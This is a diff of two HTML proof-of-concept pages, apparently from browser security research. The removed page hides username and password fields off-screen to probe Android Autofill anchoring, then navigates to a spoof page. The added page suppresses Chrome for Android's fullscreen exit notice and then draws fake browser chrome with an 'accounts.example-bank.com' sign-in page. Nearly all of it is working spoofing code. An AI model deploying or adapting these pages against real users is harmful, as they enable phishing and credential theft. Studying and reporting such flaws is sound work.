@@ -1,159 +1,108 @@
-```html
 <!DOCTYPE html>
 <html>
 <head>
-  <meta name="viewport"
-        content="width=device-width, initial-scale=1.0, user-scalable=no">
-
-  <title>Android Autofill FillUi out-of-bounds anchor</title>
-
-  <style>
-    html,
-    body {
-      margin: 0;
-      padding: 0;
-      height: 100%;
-      overflow: hidden;
-    }
-
-    /*
-     * Autofill target positioned above the viewport.
-     *
-     * The purpose of this PoC is to test whether the negative
-     * viewport/widget coordinate is propagated into the Android
-     * Autofill UI anchor instead of being clamped.
-     */
-    #u {
-      position: fixed;
-      top: -120px;
-      left: 0;
-      width: 300px;
-      height: 40px;
-      font-size: 16px;
-    }
-
-    #p {
-      position: fixed;
-      top: -200px;
-      left: 0;
-      width: 300px;
-      height: 40px;
-      font-size: 16px;
-    }
-
-    /*
-     * Visible activation surface.
-     */
-    #tap {
-      position: fixed;
-      top: 40px;
-      left: 20px;
-      right: 20px;
-
-      padding: 18px;
-
-      background: #1a73e8;
-      color: #fff;
-
-      font: 18px sans-serif;
-      text-align: center;
-
-      border-radius: 6px;
-      cursor: pointer;
-
-      user-select: none;
-      -webkit-user-select: none;
-    }
-
-    #log {
-      position: fixed;
-      top: 120px;
-      left: 20px;
-      right: 20px;
-
-      font: 12px monospace;
-      white-space: pre-wrap;
-    }
-  </style>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Fullscreen exit-notice suppression (Android)</title>
+<style>
+  html, body { margin: 0; height: 100%; font-family: sans-serif; }
+  #stage {
+    height: 100%; display: flex; flex-direction: column;
+    align-items: center; justify-content: center; gap: 16px;
+    background: #111; color: #eee;
+  }
+  button { font-size: 18px; padding: 14px 22px; }
+  #log { font-size: 12px; max-width: 90vw; white-space: pre-wrap; }
+  #spoof {
+    display: none; position: fixed; inset: 0; background: #fff; color: #000;
+  }
+  #spoof.on { display: block; }
+  /* Fake browser chrome shown once we believe the real exit notice is gone */
+  #fakebar {
+    height: 56px; background: #f1f3f4; border-bottom: 1px solid #ccc;
+    display: flex; align-items: center; padding: 0 12px; font-size: 14px;
+  }
+  #fakeurl {
+    flex: 1; background: #fff; border: 1px solid #ccc; border-radius: 20px;
+    padding: 8px 14px;
+  }
+</style>
 </head>
-
 <body>
+<div id="stage">
+  <div><b>Chrome for Android — fullscreen exit-notice suppression</b></div>
+  <button id="prep">Step&nbsp;1: open helper popup</button>
+  <button id="go">Step&nbsp;2: enter fullscreen (tap = user activation)</button>
+  <div id="log"></div>
+</div>
 
-  <form action="/login" method="post" id="f">
+<!-- Spoofed UI shown after the security notice is suppressed -->
+<div id="spoof">
+  <div id="fakebar">
+    <span style="margin-right:8px">&#x1f512;</span>
+    <div id="fakeurl">https://accounts.example-bank.com/login</div>
+  </div>
+  <div style="padding:24px">
+    <h2>Sign in</h2>
+    <p>The real "swipe down to exit full screen" notice has been suppressed.
+       The user has no on-screen instruction telling them they are in
+       tab-fullscreen. Everything above this line is attacker-drawn.</p>
+  </div>
+</div>
 
-    <input
-      id="u"
-      name="username"
-      type="text"
-      autocomplete="username">
+<script>
+const log = m => {
+  document.getElementById('log').textContent += m + "\n";
+  console.log(m);
+};
 
-    <input
-      id="p"
-      name="password"
-      type="password"
-      autocomplete="current-password">
+let popup = null;
 
-  </form>
+// Step 1: open a script-openable tab so we can later call popup.close().
+// NOTE: per source audit, TabModelSelectorImpl.onCloseContents() sets
+// allowUndo(false), so this does NOT enqueue an UndoBar TYPE_ACTION snackbar.
+// Kept here to demonstrate the *attempted* deterministic vector and to make
+// manual testing of any future regression trivial.
+document.getElementById('prep').onclick = () => {
+  popup = window.open('about:blank', '_blank');
+  log(popup ? "[+] helper popup opened" : "[!] popup blocked");
+};
 
-  <!-- Single physical tap -->
-  <label id="tap" for="u">
-    Tap to sign in
-  </label>
+document.getElementById('go').onclick = async () => {
+  try {
+    await document.documentElement.requestFullscreen({ navigationUI: "hide" });
+    log("[+] requestFullscreen() resolved");
+  } catch (e) {
+    log("[!] requestFullscreen() rejected: " + e);
+    return;
+  }
 
-  <pre id="log"></pre>
+  // ---- Vector 1 (blocked in current tree): script-closed tab -> UndoBar ----
+  // Fired immediately so that, *if* an UndoBar were produced, it would
+  // addFirst() over the ExclusiveAccessBubble snackbar that was just queued.
+  if (popup && !popup.closed) {
+    setTimeout(() => {
+      try { popup.close(); log("[*] popup.close() sent"); } catch (e) {}
+    }, 50);
+  }
 
-  <script>
-    const log = message => {
-      document.getElementById('log').textContent += message + '\n';
-    };
+  // ---- Vector 2 (works, but needs user gesture): swipe-to-dismiss ----------
+  // SnackbarView wires SnackbarSwipeHandler unconditionally; a horizontal
+  // swipe on the security notice removes it with no re-show
+  // (ExclusiveAccessContextAndroid::OnExclusiveAccessUserInput is a no-op).
+  log("[*] Now SWIPE the bottom snackbar horizontally.");
 
-    const button = document.getElementById('tap');
-    const username = document.getElementById('u');
+  // After the snackbar's lifetime, reveal the spoofed browser chrome.
+  // Default TYPE_ACTION duration + cascade window ≈ 10s.
+  setTimeout(() => {
+    document.getElementById('spoof').classList.add('on');
+    log("[+] spoof UI shown — no exit instruction remains on screen");
+  }, 11000);
+};
 
-    button.addEventListener('click', () => {
-
-      log('User activation received.');
-      log('Executing autofill focus sequence 3 times...');
-
-      /*
-       * One physical tap -> three focus attempts.
-       */
-      for (let i = 1; i <= 3; i++) {
-
-        username.focus({
-          preventScroll: true
-        });
-
-        const rect = username.getBoundingClientRect();
-
-        log(
-          'Attempt #' + i +
-          ': y=' + rect.top +
-          ' h=' + rect.height
-        );
-
-        log(
-          'Viewport=' +
-          window.innerWidth +
-          'x' +
-          window.innerHeight
-        );
-      }
-
-      log('');
-      log('Completed 3 focus attempts from one physical tap.');
-      log('Expected target Y coordinate: negative.');
-
-      /*
-       * Allow time for the Autofill UI to become visible.
-       */
-      setTimeout(() => {
-        log('Navigating to spoof2.html...');
-        document.location = 'spoof2.html';
-      }, 6000);
-    });
-  </script>
-
+document.addEventListener('fullscreenchange', () => {
+  log("fullscreenElement = " + (document.fullscreenElement ? "<html>" : "null"));
+});
+</script>
 </body>
 </html>
-```
